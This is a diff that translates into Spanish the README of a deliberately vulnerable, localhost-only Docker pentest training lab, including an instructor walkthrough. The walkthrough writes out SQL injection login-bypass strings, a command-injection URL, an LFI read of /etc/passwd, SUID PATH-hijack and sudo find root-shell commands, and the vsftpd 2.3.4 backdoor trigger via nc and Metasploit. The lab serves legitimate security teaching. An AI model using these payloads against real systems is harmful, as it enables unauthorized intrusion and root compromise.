@@ -1,88 +1,87 @@
-# DEMO Lab — single-container pentest exercise
+# Lab DEMO — ejercicio de pentest en un contenedor
 
-> **Authorized training use only.** Vulnerable by design. Binds to `127.0.0.1`
-> only. Do not expose to any untrusted network.
+> **Solo para uso de entrenamiento autorizado.** Vulnerable a propósito. Escucha
+> solo en `127.0.0.1`. No lo expongas a ninguna red no confiable.
 
-One Docker container running two services. The student chains:
-anonymous FTP recon → web SQLi login bypass → command injection (foothold as
-`www-data`) → privilege escalation → `root` → flag in `/root/flag.txt`.
+Un contenedor Docker con dos servicios. El alumno encadena:
+recon FTP anónimo → bypass de login web por SQLi → command injection (foothold como
+`www-data`) → escalada de privilegios → `root` → flag en `/root/flag.txt`.
 
-Extra teaching paths for the class: a **Local File Inclusion** in the
-diagnostics page, and an **alternate privesc** via `sudo find` (GTFOBins)
-besides the SUID PATH hijack.
+Rutas extra para la clase: un **Local File Inclusion** en la página de diagnóstico,
+y un **privesc alternativo** vía `sudo find` (GTFOBins) además del SUID PATH hijack.
 
-## Services
-| Port | Service | Role |
-|------|---------|------|
-| 21 (+21000-21010 passive) | FTP "vsftpd 2.3.4", anonymous | recon / hint **+ 2.3.4 backdoor** |
-| 6200 | (opens on backdoor trigger) | unauthenticated **root** shell |
-| 80 | Apache + PHP + SQLite | SQLi login bypass → command injection (RCE) + LFI |
+## Servicios
+| Puerto | Servicio | Rol |
+|--------|----------|-----|
+| 21 (+21000-21010 pasivo) | FTP "vsftpd 2.3.4", anónimo | recon / pista **+ backdoor 2.3.4** |
+| 6200 | (se abre al disparar el backdoor) | shell **root** sin autenticación |
+| 80 | Apache + PHP + SQLite | bypass de login por SQLi → command injection (RCE) + LFI |
 
-## Run
-Prefer the top-level launcher (`../lab.sh` / `../lab.ps1`) which starts this lab
-together with the exam and prints the ports. Standalone:
+## Ejecución
+Preferí el launcher de la raíz (`../lab.sh` / `../lab.ps1`), que levanta este lab
+junto con el examen e imprime los puertos. De forma independiente:
 ```bash
 docker compose up -d --build
-docker compose port lab 80     # web  -> 127.0.0.1:<random port>
-docker compose port lab 21     # ftp  -> 127.0.0.1:<random port>
+docker compose port lab 80     # web  -> 127.0.0.1:<puerto aleatorio>
+docker compose port lab 21     # ftp  -> 127.0.0.1:<puerto aleatorio>
 ```
-Ports are published to **random free host ports on `127.0.0.1`** so they never
-collide. Passive FTP data ports stay fixed at **21000-21010**.
+Los puertos se publican en **puertos host libres al azar en `127.0.0.1`** para que
+nunca choquen. Los puertos de datos del FTP pasivo quedan fijos en **21000-21010**.
 
-Reset between students (removes container **and** network, state is ephemeral):
+Reiniciar entre alumnos (elimina contenedor **y** red, el estado es efímero):
 ```bash
 docker compose down && docker compose up -d --build
 ```
 
-## Intended solution (instructor only)
-1. **Recon FTP** — on Linux the target is a host at `172.30.0.10`
-   (`nmap -sV 172.30.0.10`; the banner advertises `vsftpd 2.3.4`). `ftp 172.30.0.10`
-   (or `ftp 127.0.0.1 <port>` on Win/Mac), log in `anonymous`, read `notes.txt`.
-   Points at the web tool and mentions a root `backup` job.
-2. **SQLi login bypass** — the diagnostics tool is gated behind a login at
-   `http://127.0.0.1:<port>/login.php`. The query concatenates input directly:
+## Solución prevista (solo instructor)
+1. **Recon FTP** — en Linux el target es un host en `172.30.0.10`
+   (`nmap -sV 172.30.0.10`; el banner anuncia `vsftpd 2.3.4`). `ftp 172.30.0.10`
+   (o `ftp 127.0.0.1 <puerto>` en Win/Mac), ingresá como `anonymous`, leé `notes.txt`.
+   Apunta a la herramienta web y menciona un job `backup` que corre como root.
+2. **Bypass de login por SQLi** — la herramienta de diagnóstico está detrás de un
+   login en `http://127.0.0.1:<puerto>/login.php`. La query concatena el input directo:
    ```
    username: admin'--
-   password: (anything)
+   password: (cualquiera)
    ```
-   or `' OR '1'='1'-- `. On success the session is set and you reach `index.php`.
-3. **Foothold (command injection)** — behind the login,
-   `index.php?host=127.0.0.1;id`. Unsanitized input → `system()`. Land as
+   o `' OR '1'='1'-- `. Al funcionar se setea la sesión y llegás a `index.php`.
+3. **Foothold (command injection)** — detrás del login,
+   `index.php?host=127.0.0.1;id`. Input sin sanitizar → `system()`. Caés como
    `www-data`. User flag: `/var/www/user.txt`.
-4. **LFI (side-path, demo only)** — the `Help` link loads pages with
-   `include($_GET['page'])`. `index.php?page=/etc/passwd` reads arbitrary files;
-   the help page itself hints at the `sudo` privesc.
-5. **Privesc — two ways to root:**
+4. **LFI (ruta lateral, solo demo)** — el link `Help` carga páginas con
+   `include($_GET['page'])`. `index.php?page=/etc/passwd` lee archivos arbitrarios;
+   la propia página de ayuda da la pista del privesc por `sudo`.
+5. **Privesc — dos caminos a root:**
    - **SUID PATH hijack** — `find / -perm -4000 2>/dev/null` → `/usr/local/bin/backup`
-     calls `tar` with no absolute path:
+     llama a `tar` sin ruta absoluta:
      ```bash
      cd /tmp
      echo -e '#!/bin/bash\n/bin/bash -p' > tar && chmod +x tar
      PATH=/tmp:$PATH /usr/local/bin/backup
      ```
-   - **sudo GTFOBins** — `sudo -l` shows `www-data` may run `find` as root:
+   - **sudo GTFOBins** — `sudo -l` muestra que `www-data` puede correr `find` como root:
      ```bash
      sudo find . -exec /bin/sh \; -quit
      ```
-   Then `cat /root/flag.txt`.
+   Luego `cat /root/flag.txt`.
 
-## Alternate instant root — vsftpd 2.3.4 backdoor (famous CVE)
-`nmap -sV` fingerprints the FTP banner as **vsftpd 2.3.4**. That version shipped a
-backdoor: a `USER` ending in `:)` opens an unauthenticated **root** shell on
-tcp/6200. This short-circuits the whole chain straight to root — good for showing
-how version fingerprinting → known-CVE works.
+## Root instantáneo alternativo — backdoor de vsftpd 2.3.4 (CVE famoso)
+`nmap -sV` identifica el banner del FTP como **vsftpd 2.3.4**. Esa versión incluyó un
+backdoor: un `USER` que termina en `:)` abre una shell **root** sin autenticación en
+tcp/6200. Esto cortocircuita toda la cadena directo a root — ideal para mostrar cómo
+funciona el fingerprint de versión → CVE conocido.
 
 Metasploit:
 ```
 use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 172.30.0.10      # on Win/Mac: 127.0.0.1, and set RPORT to the mapped FTP port
+set RHOSTS 172.30.0.10      # en Win/Mac: 127.0.0.1, y setear RPORT al puerto FTP mapeado
 run
 ```
 Manual:
 ```bash
-# trigger over the control channel
+# disparar por el canal de control
 printf 'USER evil:)\r\nPASS x\r\n' | nc 172.30.0.10 21
-# catch the root shell
+# atrapar la shell root
 nc 172.30.0.10 6200
 id   # uid=0(root)
 ```
